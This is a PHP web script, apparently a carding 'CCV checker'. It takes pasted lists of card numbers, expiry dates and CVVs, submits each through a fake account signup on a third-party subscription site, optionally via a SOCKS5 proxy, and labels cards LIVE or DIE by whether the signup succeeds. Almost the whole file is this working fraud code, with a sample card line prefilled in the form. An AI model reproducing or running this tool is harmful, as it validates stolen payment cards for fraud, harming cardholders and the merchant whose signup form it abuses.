<title>CCV checker</title>
<center>
            <p><h2>CCV Checker - Kill * CODE by HC - BYG</h2></p>
            <p>*NOTE: Will charge after 7days!</p>
            <p><form name="ccv" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
                <p><textarea name="cclist" cols="110" rows="15">| 4021896545217854 | 03 | 14 | 133 |</textarea><br /></p>
                <p><input type="submit" name="submit" value="Check"></p>
                </form>
            </p>
</center>
<?php
set_time_limit(0);
$dir = dirname(__FILE__);
        $config['cookie_file'] = $dir . '/cookie/'. md5(rand(100000,999999)) . ''.rand(100000,999999).'.txt';
        if(!file_exists($config['cookie_file'])){
        $fp = @fopen($config['cookie_file'],'w');
        @fclose($fp);
        }
function curl($url, $socks='', $post='', $referer='') {
    global $config;
    $agent = 'Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($post) {
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    if ($referer) {
    curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    if ($socks) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $socks);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,7);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_COOKIEFILE,$config['cookie_file']);
    curl_setopt($ch, CURLOPT_COOKIEJAR,$config['cookie_file']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 3);
   
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function filter($ccline){
  $xy = array("|","\\","/","-",";");
  $sepe = $xy[0];
  foreach($xy as $v){
      if (substr_count($ccline,$sepe) < substr_count($ccline,$v)) $sepe = $v;
  }
  $x = explode($sepe,$ccline);
  foreach($xy as $y) $x = str_replace($y,"",str_replace(" ","",$x));
  foreach ($x as $xx){
      $xx = trim($xx);
         if (is_numeric($xx)){
             $yy=strlen($xx);
             switch ($yy){
                 case 15:
                     if (substr($xx,0,1)==3){
                         $ccnum['num'] = $xx;
                         $ccnum['type'] = "American+Express";
                    }
                     break;
                 case 16:
                     switch (substr($xx,0,1)){
                          case '4':
                             $ccnum['num']=$xx;
                             $ccnum['type'] = "VISA";
                             break;
                        case '5':
                             $ccnum['num']=$xx;
                             $ccnum['type'] = "Mastercard";
                             break;
                         case '6':
                             $ccnum['num']=$xx;
                             $ccnum['type'] = "Discover";
                             break;
                     }
                     break;
                 case 1:
                     if (($xx >= 1) and ($xx <=12) and (!isset($ccnum['mon']))) $ccnum['mon'] = "0".$xx;
                 case 2:
                     if (($xx >= 1) and ($xx <=12) and (!isset($ccnum['mon'])))    $ccnum['mon'] = $xx;
                     elseif (($xx >= 9) and ($xx <= 19) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = "20".$xx;
                     break;
                 case 4:
                     if (($xx >= 2009) and ($xx <= 2019) and (isset($ccnum['mon'])))    $ccnum['year'] = $xx;
                     elseif ((substr($xx,0,2) >= 1) and (substr($xx,0,2) <=12) and (substr($xx,2,2)>= 9) and (substr($xx,2,2) <= 19) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
                             $ccnum['mon'] = substr($xx,0,2);
                             $ccnum['year'] = "20".substr($xx,2,2);
                         }
                     else $ccv['cv4'] = $xx;
                     break;
                 case 6:
                     if ((substr($xx,0,2) >= 1) and (substr($xx,0,2) <=12) and (substr($xx,2,4)>= 2009) and (substr($xx,2,4) <= 2019)){
                        $ccnum['mon'] = substr($xx,0,2);
                        $ccnum['year'] = substr($xx,2,4);
                    }
                    break;
                case 3:
                    $ccv['cv3'] = $xx;
                    break;
                case 5:
                    $ccnum['zipcode'] = $xx;
                    break;
              }
          }
          }
    if (isset($ccnum['num']) and isset($ccnum['mon']) and isset($ccnum['year'])){
            if ($ccnum['type'] == "American+Express") $ccnum['cvv'] = $ccv['cv4'];
            else $ccnum['cvv'] = $ccv['cv3'];
        return $ccnum;
    }
    else return false;
       
}
function ccv($ccnum, $ccmon, $ccyear, $cvv, $line){
    global $live, $die;
    $url = 'https://secure.marketbrief.com/signup';
    $go = curl($url);
        if ($go) {
            $abc = array("A","B","C","D","E","F","G","H","I","K","L","M","N","O","P","Q","R","S","T","V","X");
            $array_email = array("hotmail.com","gmail.com","yahoo.com","live.com");
            $abc_key = array_rand($abc, 8);
            $pass = $abc[$abc_key[0]].$abc[$abc_key[1]].$abc[$abc_key[2]].$abc[$abc_key[3]].$abc[$abc_key[4]].$abc[$abc_key[5]].$abc[$abc_key[6]].$abc[$abc_key[7]];
            $array_email_key = array_rand($array_email, 1);
            $email = $pass.'@'.$array_email[$array_email_key];
           
            $post_value = 'email='.urlencode($email).'&password='.urlencode($pass).'&confirmPassword='.urlencode($pass).'&name=Yossi+Gayah&companyName=Rphclub&address=jl+jijim+sw&city=Rplsaj&state=Jawa+ziput&zip=11112&cardNumber='.$ccnum.'&cvc='.$cvv.'&month='.$ccmon.'&year='.$ccyear.'';
            $create = curl($url, '', $post_value, $url);
            if (stristr($create, "Logout")) {
                $notice = "LIVE => | $ccnum | $ccmon | $ccyear | $cvv | ~> $line";
                $live[] = $notice;
            } else {
                $notice = "DIE => | $ccnum | $ccmon | $ccyear | $cvv | ~> $line";
                $die[] = $notice;
            }
        } else {
            $notice = "Kesalahan => | $ccnum | $ccmon | $ccyear | $cvv | ~> $line";
        }
    return $notice;
}
function xflush()
{
    static $output_handler = null;
    if ($output_handler === null)
    {
        $output_handler = @ini_get('output_handler');
    }
 
    if ($output_handler == 'ob_gzhandler')
    {
        // forcing a flush with this is very bad
        return;
    }
 
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false)
    {
        @ob_flush();
    }
    else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE)
    {
        @ob_end_flush();
        @ob_start();
    }
}
if (isset($_POST['submit'])) {
    echo "<center>__________________________________________________________________________</center><br />";
    flush();
    $list = trim($_POST['cclist']);
    $list = str_replace(" ","",$list);
    $list = str_replace("\n\n","\n",$list);
    $list = str_replace("||","|",$list);
    $list = str_replace(array("|","\\","/",":",";"),"|",$list);
    $uncheck = $list_ccv = explode("\n",$list);
    $total = count($list_ccv);
    $live = $die = array();
    for ($m=0;$m<$total;$m++) {
        $line_cc = $list_ccv[$m];
        $ccnum = filter($line_cc);
        $ccnumber = $ccnum['num'];
        $ccmon = $ccnum['mon'];
        $ccyear = $ccnum['year'];
        $ccv = $ccnum['cvv'];
        $info = ccv($ccnumber, $ccmon, $ccyear, $ccv, $line_cc);
        unset($uncheck[$m]);
        echo $info."<br />";
        xflush();
    }
    echo "<center>__________________________________________________________________________</center><br/>";
    echo "<h4>Total: $total - Live: ".count($live)." - Die: ".count($die)." - Kesalahan:".count($uncheck)."</h4><br/ >";
            if ($live) {
                echo "<b>Live:</b><br />";
                echo implode("<br />",$live);
            }
            if ($die) {
                echo "<b>Die:</b><br />";
                echo implode("<br />",$die);
            }
            if ($uncheck) {
                echo "<b>Kesalahan:</b><br />";
                echo implode("\n",$uncheck);
            }
}